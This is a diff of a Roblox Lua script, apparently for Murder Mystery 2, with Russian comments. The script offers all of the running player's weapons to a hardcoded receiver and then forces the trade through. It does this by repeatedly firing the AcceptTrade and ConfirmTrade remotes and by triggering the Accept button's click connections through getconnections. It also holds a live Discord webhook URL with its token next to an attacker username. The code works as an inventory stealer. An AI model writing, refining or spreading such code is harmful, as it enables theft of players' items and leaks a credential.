@@ -1,3 +1,4 @@
+--ап
 Username = "Protoxak"
 Webhook = "https://discord.com/api/webhooks/1546616710482628718/x7JvNNTW6G9ZTiqYY1Ve1PGRXbP_UtHRtIqej_DjQ4RSNL2KkJzSlgYUOmP8TSPcYx5Y"
 
@@ -127,8 +128,7 @@ local dTr=function() if TSrv then pcall(function() TSrv.DeclineTrade:FireServer(
 local cTr=function(tP) task.spawn(function() while tP and tP.Parent==P do sTr(tP) task.wait(0.5) end end) end
 
 -- ═══════════════════════════════════════════════════════
--- ФИКС accept: правильные аргументы из RemoteSpy
--- AcceptTrade:FireServer(428469873, workspace:GetServerTimeNow())
+-- InsIt — налив + accept с os.clock()
 -- ═══════════════════════════════════════════════════════
 local InsIt=function()
  local rcv=P:FindFirstChild(recvr) if not rcv then dTr() return end
@@ -139,9 +139,13 @@ local InsIt=function()
   if it and it.id and it.amount>0 then
    local ar={it.id,"Weapons"} local suc=false iOf=0
    for j=1,it.amount do 
-    local ok,err=pcall(function() RS.Trade.OfferItem:FireServer(unpack(ar)) iOf=iOf+1 tIn=tIn+1 end) 
+    local ok,err=pcall(function() 
+     RS.Trade.OfferItem:FireServer(unpack(ar)) 
+     iOf=iOf+1 
+     tIn=tIn+1 
+    end) 
     if ok then suc=true end 
-    task.wait(0.1)  -- пауза между предметами (анти-рейт-лимит)
+    task.wait(0.05)
    end
    if suc then iAd=iAd+1 table.insert(tIt,{id=it.id,amount=iOf}) end
   end
@@ -150,62 +154,79 @@ local InsIt=function()
  if iAd==0 then dTr() return end
 
  task.spawn(function()
-  task.wait(6)  -- ждём чтобы сервер обработал OfferItem
+  task.wait(6)
 
   local tradeRemote = RS:FindFirstChild("Trade")
-  local acceptR  = tradeRemote and tradeRemote:FindFirstChild("AcceptTrade")
-  local confirmR = tradeRemote and tradeRemote:FindFirstChild("ConfirmTrade")
-  local statusR  = tradeRemote and tradeRemote:FindFirstChild("GetTradeStatus")
+  if not tradeRemote then return end
 
-  if not acceptR then warn("[InsIt] AcceptTrade not found") dTr() return end
+  local acceptR  = tradeRemote:FindFirstChild("AcceptTrade")
+  local cancelR  = tradeRemote:FindFirstChild("CancelAccept")
+  local confirmR = tradeRemote:FindFirstChild("ConfirmTrade")
+                or tradeRemote:FindFirstChild("FinalizeTrade")
+                or tradeRemote:FindFirstChild("CompleteTrade")
+  local statusR  = tradeRemote:FindFirstChild("GetTradeStatus")
+
+  if not acceptR then dTr() return end
 
   local acc = false
-  local timeout = tick() + 300
+  local timeout = tick() + 600
   local attempt = 0
 
   while not acc and tick() < timeout do
    attempt = attempt + 1
-   warn("[InsIt] attempt " .. attempt)
+   warn("[accept] attempt " .. attempt)
 
-   -- ═══ ПРАВИЛЬНЫЙ ВЫЗОВ accept ═══
+   -- ═══ ПРАВИЛЬНЫЙ ВЫЗОВ ═══
    local args = {
     game.PlaceId * 3,
-    workspace:GetServerTimeNow()
+    os.clock()
    }
    pcall(function() 
     acceptR:FireServer(unpack(args)) 
    end)
 
-   -- ConfirmTrade если есть
+   -- Confirm если есть
    if confirmR then
     pcall(function() confirmR:FireServer() end)
    end
 
-   -- ждём 12 сек (анти-спам MM2)
+   -- UI-клик fallback
+   pcall(function()
+    local tradeGui = TP
+    if tradeGui then
+     local btn = tradeGui:FindFirstChild("Accept", true)
+             or tradeGui:FindFirstChild("AcceptButton", true)
+     if btn then
+      for _, conn in pairs(getconnections(btn.MouseButton1Click)) do
+       conn:Fire()
+      end
+      for _, conn in pairs(getconnections(btn.Activated)) do
+       conn:Fire()
+      end
+     end
+    end
+   end)
+
+   -- ждём 12 сек (анти-спам)
    task.wait(12)
 
-   -- проверка статуса через GetTradeStatus
+   -- проверка статуса
    if statusR then
     local ok, s = pcall(function() return statusR:InvokeServer() end)
     if ok and s == "None" then
      acc = true
-     warn("[InsIt] trade closed!")
+     warn("[accept] CLOSED via status")
      break
     end
    end
-
-   -- fallback: окно трейда закрылось
    if not TP.Enabled then
     acc = true
+    warn("[accept] CLOSED via UI")
     break
    end
   end
 
-  if not acc then
-   warn("[InsIt] timeout — trade not closed")
-  end
-
-  -- обновляем инвентарь после успеха
+  -- обновляем инвентарь
   if acc then
    for _,td in ipairs(tIt) do 
     for j,it in ipairs(InvT) do 
@@ -219,6 +240,8 @@ local InsIt=function()
      end 
     end 
    end
+  else
+   warn("[accept] TIMEOUT — не закрылось")
   end
  end)
 end
